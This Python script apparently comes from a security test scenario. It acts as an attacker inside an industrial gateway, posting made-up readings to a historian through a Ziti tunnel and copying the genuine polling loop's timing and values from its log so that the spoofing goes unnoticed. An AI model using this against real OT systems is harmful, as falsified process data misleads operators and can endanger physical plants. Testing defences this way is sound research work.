"""Attacker's historian client, run in a gateway while a fake gateway-poller
keeps the declared posture in order.

Posts made-up readings to the historian through the Ziti tunnel every
<interval> seconds for <duration> seconds, as the gateway, with no Modbus
reads. To look like the polling loop it replaces, it takes the time and
value of the last read from the polling loop's own log and carries on from
there: it posts when the loop would have, and the value grows as the plc's
holding register 0 does (+1 every REGISTER_STEP_S). Run with the standard
interpreter: it can dial only because the fake gateway-poller satisfies the
process posture check. Prints one line per post: UTC time, value, outcome,
duration.

Copied into a gateway by run.sh:

    python /tmp/attacker.py <duration s> <interval s>

Its pid is kept in /tmp/attacker.pid, so the scenario script can stop it
early. On SIGTERM it finishes the post in progress and prints its line, so
that every post that reached the historian is recorded.
"""

import datetime
import os
import re
import signal
import sys
import threading
import time

import requests

GATEWAY_ID = os.environ.get("GATEWAY_ID", "gateway-a")
HISTORIAN_URL = os.environ.get(
    "HISTORIAN_URL", "http://historian.ziti:5000/api/readings"
)
POLLER_LOG = f"/logs/poller/poller-{GATEWAY_ID}.log"
REGISTER_STEP_S = 2   # the plc's holding register 0 grows by 1 every 2 s

# e.g. "2026-10-25T15:30:44.200Z gateway-a read=91 post=201 113ms": the line
# is written after the post, so the read happened <ms> earlier
LINE = re.compile(r"^(\S+)Z \S+ read=(\d+) post=\S+ (\d+)ms")

stop = threading.Event()


def utc_now():
    now = datetime.datetime.now(datetime.timezone.utc)
    return now.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def last_read():
    """(epoch time, value) of the polling loop's last successful read."""
    with open(POLLER_LOG) as f:
        lines = f.readlines()
    for line in reversed(lines):
        m = LINE.match(line)
        if m:
            t = datetime.datetime.fromisoformat(m.group(1)).replace(
                tzinfo=datetime.timezone.utc
            )
            return t.timestamp() - int(m.group(3)) / 1000, int(m.group(2))
    sys.exit(f"no read in {POLLER_LOG}")


def post(session, value):
    try:
        r = session.post(
            HISTORIAN_URL, json={"gateway": GATEWAY_ID, "value": value}, timeout=5
        )
        return f"post={r.status_code}"
    except requests.RequestException as e:
        return f"post=- {e.__class__.__name__}"


def main():
    duration, interval = float(sys.argv[1]), float(sys.argv[2])
    with open("/tmp/attacker.pid", "w") as f:
        f.write(str(os.getpid()))
    for sig in (signal.SIGTERM, signal.SIGINT):
        signal.signal(sig, lambda *_: stop.set())
    session = requests.Session()

    # first slot of the polling loop's schedule still ahead of us
    read_t, read_value = last_read()
    slots = int((time.time() - read_t) // interval) + 1
    first_t = read_t + slots * interval
    next_run = time.monotonic() + (first_t - time.time())
    end = time.monotonic() + duration
    stop.wait(max(0.0, next_run - time.monotonic()))
    while not stop.is_set() and next_run < end:
        value = read_value + int((time.time() - read_t) // REGISTER_STEP_S)
        t, t0 = utc_now(), time.monotonic()
        result = post(session, value)
        ms = int((time.monotonic() - t0) * 1000)
        print(f"{t} value={value} {result} {ms}ms", flush=True)
        next_run += interval
        stop.wait(max(0.0, next_run - time.monotonic()))


if __name__ == "__main__":
    main()
